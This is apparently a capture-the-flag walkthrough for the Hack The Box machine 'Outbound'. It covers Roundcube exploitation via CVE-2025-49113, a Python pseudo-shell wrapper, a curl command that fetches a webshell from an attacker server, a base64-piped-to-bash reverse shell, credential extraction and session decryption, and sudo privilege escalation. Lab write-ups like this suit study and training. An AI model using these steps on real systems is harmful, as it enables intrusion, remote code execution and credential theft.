Difficulty: Easy (I'd say closer to medium)

Port 22 and 80 open, so obviously just enum port 80, where you find mail.outbound.htb, so use the given creds to login.
Roundcube mail (the service) is vulnerable to this [exploit](https://github.com/hakaioffsec/CVE-2025-49113-exploit).

Also I used this script to get the shell (just copy this into a file named exploit.py in the same directory as the CVE PoC I linked).
```python
import os
import requests

url = "http://mail.outbound.htb/smiles.txt"

command = ""
while command != 'exit':
    command = input("command> ")

    if command == 'exit':
        break
    
    if command == 'clear':
        os.system('clear')
        continue

    shell_cmd = f"php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 \"{command} \""

    os.system(shell_cmd)
    res = requests.get(url)
    if not len(res.text):
        print("No response received")
    else:
        print(res.text)
else:
    print("bye")
```

Into this pseudo-shell just run `curl http://[your-server-address]/shell.php -o /var/www/html/roundcube/public_html/smiles.php` (i used my own php webshell here).

To get a revshell, base64 encode the payload and then do  `echo [base64-encoded-payload] | base64 -d | bash`, which will give you a shell.

Now you can read config.inc.php in the config/ file to get these creds:
1. `roundcube:RCDBPass2025` -> These are mysql creds
2. `$config['des_key'] = 'rcmail-!24ByteDESkey*Str';` -> we need this to decrypt the session data

This is the hard part, so we have the session data (from session table in mysql), base64 decode the password (from the serialized data, it will be base64 encoded, so decode it and then read) and then turn it into hex. This gives the triple DES bytes. Now from that take the first 8 bytes as the IV value and the DES key we got as the other key input in cyberchef. Use everything after the first 8 bytes as password. This will give the email login.

`jacob:595mO8DmwGeD` -> email login

`jacob:gY4Wr3a1evp4` -> password, just read the email after using the login creds above.

This gives ssh access and user.

On running `sudo -l` we can see /usr/bin/below can be run. It is vulnerable to this exploit:
https://github.com/BridgerAlderson/CVE-2025-27591-PoC/blob/main/exploit.py -> Use this for root access, literally just run it and do `su attacker`

https://labs.hackthebox.com/achievement/machine/1785577/672
